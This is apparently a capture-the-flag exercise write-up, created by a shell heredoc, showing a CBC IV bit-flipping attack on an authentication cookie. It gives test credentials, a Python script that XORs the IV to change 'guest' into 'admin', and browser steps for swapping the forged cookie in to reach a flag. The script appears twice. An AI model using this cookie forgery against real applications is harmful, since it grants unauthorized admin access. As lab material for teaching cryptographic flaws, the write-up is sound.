cat > Payloads.md <<'EOF'
# Payloads - Exercise 02

## 1. Test Login Credentials

The test account used during the exercise:

| Field | Value |
|---|---|
| Username | guest |
| Password | guestpass |

These credentials were used to obtain a valid authenticated session.

## 2. Original Cookie

After login, the application created a cookie named:

`token`

The cookie contains a Base64-encoded IV.

The IV is 16 bytes long because AES uses a 16-byte block size.

The cookie value changes between sessions, so the original value must
be obtained from the current browser session.

## 3. IV Bit-Flipping Payload

The goal was to change the first five plaintext bytes:

- Original plaintext: `guest`
- Target plaintext: `admin`

The CBC IV modification formula is:

`IV_new = IV_old XOR "guest" XOR "admin"`

Python example:

```python
import base64

token_value = "REPLACE_WITH_CURRENT_TOKEN_VALUE"

token_value += "=" * ((4 - len(token_value) % 4) % 4)

old_iv = base64.b64decode(token_value)
new_iv = bytearray(old_iv)

for i, (old_char, target_char) in enumerate(zip(b"guest", b"admin")):
    new_iv[i] = old_iv[i] ^ old_char ^ target_char

new_token = base64.b64encode(new_iv).decode()

print("Modified token:", new_token)


Replace REPLACE_WITH_CURRENT_TOKEN_VALUE with the current token
cookie value.
4. Applying the Payload
1. Log in using the test account.
2. Open the browser Developer Tools.
3. Navigate to Application > Cookies.
4. Locate the cookie named token.
5. Replace its value with the modified Base64 value.
6. Reload the page.
The application then decrypts the unchanged ciphertext using the
modified IV.
5. Expected Result
The application interprets the decrypted identity as admin and
displays the flag.

The attack modifies the IV only. It does not require the encryption key
or modification of the ciphertext.

Note: This is a CBC IV Bit-Flipping attack, not a demonstrated
classic Padding Oracle attack.
EOF


import base64

token_value = "REPLACE_WITH_CURRENT_TOKEN_VALUE"

token_value += "=" * ((4 - len(token_value) % 4) % 4)

old_iv = base64.b64decode(token_value)
new_iv = bytearray(old_iv)

for i, (old_char, target_char) in enumerate(zip(b"guest", b"admin")):
    new_iv[i] = old_iv[i] ^ old_char ^ target_char

new_token = base64.b64encode(new_iv).decode()

print("Modified token:", new_token)
